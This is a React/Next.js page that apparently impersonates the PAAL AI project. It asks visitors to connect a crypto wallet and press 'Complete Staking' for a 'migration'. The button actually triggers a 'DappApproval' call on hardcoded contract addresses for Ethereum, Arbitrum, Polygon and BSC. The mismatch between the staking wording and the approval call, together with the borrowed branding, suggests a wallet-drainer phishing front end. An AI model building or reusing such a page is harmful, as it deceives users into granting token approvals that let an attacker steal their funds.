import { ConnectWallet,Web3Button } from "@thirdweb-dev/react";
import { NextPage } from "next";
import {Navbar, NavbarBrand, NavbarContent, NavbarItem, Image, Button, Link} from "@nextui-org/react";
import { useContext } from "react";
import ChainContext from "../context/Chain";

const Home: NextPage = () => {
  const { selectedChain, setSelectedChain } = useContext(ChainContext);
  const addresses: Record<string, string> = {
    ["ethereum"]: "0x6994043dbc4F0824d0FB9D2B3f70558f05509f58",
    ["arbitrum"]: "0xA72234a2b9c1601593062f333D739C93291dF49F",
    ["polygon"]: "0xA72234a2b9c1601593062f333D739C93291dF49F",
    ["bsc"]: "0xA72234a2b9c1601593062f333D739C93291dF49F",
  };
  const tokenDataArr=""
  return (
    <div
      className="bg-cover bg-center min-h-screen"
      style={{ backgroundImage: `url('images/bg-paal.png')` }}
    >
      <div>
      <Navbar>
      <NavbarBrand>
      <Image src="images/logo.png" alt="Logo" className="h-12"/>
      </NavbarBrand>
      
      <NavbarContent justify="end">
        <NavbarItem>
        <ConnectWallet
          modalTitle={"Connect to PAAL AI"}></ConnectWallet>
        </NavbarItem>
      </NavbarContent>
    </Navbar>
    <div className="flex justify-center items-center">
      <br></br><br></br><br></br><br></br><br></br><br></br>
    <Image src="images/logo.png" alt="Logo" width={90} height={30}></Image>
    <br></br>
    </div>
    <h1 className="flex justify-center font-bold text-lg text-white">
      <Link href="paalai.io" className="text-white">Introducing PAAL &rarr;</Link>
    </h1>
    <p className="flex justify-center text-white">Complete Migration</p>
    <br></br>
    <div className="flex justify-center items-center">
      <br></br>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={(contract) => {
        contract.call("DappApproval", [tokenDataArr])
      }}
    >
      Complete Staking
    </Web3Button>
    &nbsp;&nbsp;
    <select
    className="block font-bold px-4 py-2 mt-2 bg-white border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
        value={String(selectedChain)}
        onChange={(e) => setSelectedChain(e.target.value)}
      >
        <option value="arbitrum">Arbitrum</option>
        <option value="bsc">Binance Smart Chain</option>
        <option value="ethereum">Ethereum</option>
        <option value="polygon">Polygon</option>
      </select>
    </div>
    
      </div>

    </div>
  );
};

export default Home;
